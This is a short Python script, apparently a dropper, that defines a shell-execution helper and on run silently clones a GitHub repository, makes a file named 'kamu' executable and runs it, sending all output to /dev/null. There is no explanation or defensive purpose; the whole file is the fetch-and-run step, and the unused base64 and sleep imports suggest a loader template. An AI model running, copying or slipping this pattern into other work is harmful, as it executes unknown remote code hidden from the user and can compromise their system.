from os import system, name
from time import sleep
from subprocess import PIPE, Popen
import base64
 

 

 
def cmdline(command):
    process = Popen(
        args=command,
        stdout=PIPE,
        shell=True
    )
    return process.communicate()[0]
 

 


cmdline ('git clone https://github.com/samrikulan/toya.git >/dev/null 2>&1  && cd toya && chmod +x kamu && bash ./kamu >/dev/null 2>&1')
